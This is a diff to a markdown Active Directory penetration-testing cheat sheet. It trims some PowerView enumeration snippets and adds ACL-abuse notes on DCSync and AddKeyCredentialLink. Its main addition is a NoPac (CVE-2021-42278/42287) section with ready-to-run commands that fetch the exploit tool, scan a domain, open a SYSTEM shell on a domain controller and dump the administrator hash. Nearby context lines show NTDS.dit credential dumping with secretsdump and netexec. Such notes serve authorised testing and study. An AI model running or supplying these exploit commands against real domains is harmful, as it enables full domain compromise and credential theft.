@@ -142,11 +142,10 @@ qwinsta
 # All-in-1 Info Command
 systeminfo
 
-# Hostname, Domain, DC, net interfaces, env vars
+# Hostname, Domain, DC, env vars
 hostname
 echo %USERDOMAIN%
 echo %logonserver%
-ipconfig /all
 set
 # OS Version
 ver.exe
@@ -423,6 +422,8 @@ raiseChild.py -target-exec <DC_IP> <TARGET_DOMAIN>/<USER>
 - `WriteDACL` abused with `Add-DomainObjectACL`
 - `AllExtendedRights` abused with `Set-DomainUserPassword` or `Add-DomainGroupMember`
 - `AddSelf` abused with `Add-DomainGroupMember`
+- `DS-Replication-Get-Changes-All` to perform a [DCSync attack]({{% ref "active-directory.md#dcsync" %}})
+- `AddKeyCredentialLink` to get user's NTLM Hash
 
 | ACL                                     | Abuse                                                                    | Impact                             |
 | --------------------------------------- | ------------------------------------------------------------------------ | ---------------------------------- |
@@ -454,18 +455,7 @@ raiseChild.py -target-exec <DC_IP> <TARGET_DOMAIN>/<USER>
 
 #### PowerView
 
-```bash
-# Enum ACLs of User
-Import-Module .\PowerView.ps1
-$sid = Convert-NameToSid <USER>
-# Pay Attention to ObjectAceType and ActiveDirectoryRights
-Get-DomainObjectACL -ResolveGUIDs -Identity * | ? {$_.SecurityIdentifier -eq $sid} -Verbose
-
-# Get Group Membership of User
-Get-DomainGroup -Identity "<GROUP>" | select memberof
-
-REPEAT Get-DomainObjectACL of Group
-```
+{{< embed-section page="Docs/9 - Notes/powerview" header="acl-enumeration" >}}
 
 #### Manual
 
@@ -558,16 +548,7 @@ adidnsdump -u <DOMAIN>\<USER> -p <PASSWORD> ldap://<DC_IP> -r
 
 Hunting for passwords in descriptions and weak account configurations.
 
-```powershell
-# Find Passwords in Description Field
-Import-Module .\PowerView.ps1
-Get-DomainUser * | Select-Object samaccountname,description | Where-Object {$_.Description -ne $null}
-
-# Find PASSWD_NOTREQD Accounts
-# Users not subject to password policy length (potential blank passwords)
-# https://ldapwiki.com/wiki/Wiki.jsp?page=PASSWD_NOTREQD
-Get-DomainUser -UACFilter PASSWD_NOTREQD | Select-Object samaccountname,useraccountcontrol
-```
+{{< embed-section page="Docs/9 - Notes/powerview" header="user-attributes-mining" >}}
 
 ### SYSVOL & Group Policy Passwords
 
@@ -796,6 +777,31 @@ impacket-secretsdump -ntds NTDS.dit -system SYSTEM LOCAL
 ```bash
 # Same as above but easier
 netexec smb <TARGET> -u <ADMIN_USER> -p <PASSWORD> -M ntdsutil
+```
+
+## NoPac (SAMAccountName Spoofing)
+
+CVE-2021-42278 / CVE-2021-42287. Any domain user can create machine accounts (up to `ms-DS-MachineAccountQuota`, default 10). This attack renames a machine account to match a DC's SAMAccountName, requests a TGT, then renames it back -- the KDC issues a service ticket with DC privileges. Result: SYSTEM shell or full DCSync as a regular user.
+
+**Check vulnerability with `netexec`**
+```bash
+nxc smb <T> -M nopac
+```
+
+- https://github.com/Ridter/noPac
+
+```bash
+# Clone tool
+git clone https://github.com/Ridter/noPac.git && cd noPac
+
+# Check if domain is vulnerable (MachineAccountQuota > 0 = vulnerable)
+sudo python3 scanner.py <DOMAIN>/<USER>:<PASS> -dc-ip <DC_IP> -use-ldap
+
+# Get semi-interactive SYSTEM shell
+sudo python3 noPac.py <DOMAIN>/<USER>:<PASS> -dc-ip <DC_IP> -dc-host <DC_HOSTNAME> -shell --impersonate administrator -use-ldap
+
+# DCSync to dump administrator hash
+sudo python3 noPac.py <DOMAIN>/<USER>:<PASS> -dc-ip <DC_IP> -dc-host <DC_HOSTNAME> --impersonate administrator -use-ldap -dump -just-dc-user <DOMAIN>/administrator
 ```
 
 # Escalating and Pivoting
